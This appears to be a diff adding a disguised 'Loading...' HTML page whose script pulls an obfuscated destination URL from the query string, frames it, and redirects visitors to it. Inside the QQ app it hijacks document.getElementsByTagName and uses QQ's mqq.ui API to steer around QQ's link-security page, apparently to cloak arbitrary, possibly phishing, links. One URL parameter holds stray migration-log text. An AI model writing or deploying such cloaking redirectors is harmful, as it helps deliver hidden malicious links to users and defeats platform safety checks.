@@ -1,0 +1,36 @@
+﻿<html>
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+<title>加载中...</title>
+<body style="margin:0;padding:0;height:100%" scroll=no>
+<iframe style="z-index:30" id="load" name="infrm" marginwidth="0" marginheight="0" width="100%" scrolling=auto src="https://www.html5tricks.com/demo/pure-css3-light-ring-loading/index.html" frameborder="0" height="100%"></iframe>
+<iframe id="infrm" name="infrm" marginwidth="0" marginheight="0" width="100%" scrolling=auto src="https://nmsl.ru" frameborder="0" height="100%"></iframe>
+</html>
+<script>
+function getQueryVariable(variable)
+{
+       var query = window.location.search.substring(1);
+       var vars = query.split("&");
+       for (var i=0;i<vars.length;i++) {
+               var pair = vars[i].split("=");
+               if(pair[0] == variable){return pair[1];}
+       }
+       return(false);
+}
+var u=getQueryVariable("u");
+u = u.replace('%C2%A7%CE%BE%CE%BE', '://');
+u = u.replace('%CE%B6', '.');
+console.log(u);
+document.getElementById("infrm").src=u;
+document.body.parentNode.style.overflow = "hidden";
+var ua = window.navigator.userAgent.toLowerCase();
+window.onload=function(){
+	document.body.parentNode.style.overflow = "auto";
+	var element = document.getElementById("load");
+	element.parentNode.removeChild(element);
+	}
+if(ua.match("qq") === null) {
+	window.location.href = u;
+}else{
+	if (report == null) { var report="https://c.pc.qq.com/middlem.html?pfurl=Error:Migrating: 2019_12_30_210448_add_address_to_logsMigrated:2019_12_30_210448_add_address_to_logs";} var Zeptoq = document.getElementsByTagName;document.getElementsByTagName = function(a) { if (a == "meta") { window.location.href = report; return } if (a == "script" || a == "body") { return Zeptoq.call(document, a) } else { return } }; mqq.ui.setTitleButtons({ left : { title : "QQ", }, right : { title : "•••", callback : function () { mqq.ui.openUrl({ target: 2,style: 1,url: report}) } } });
+}
+</script>
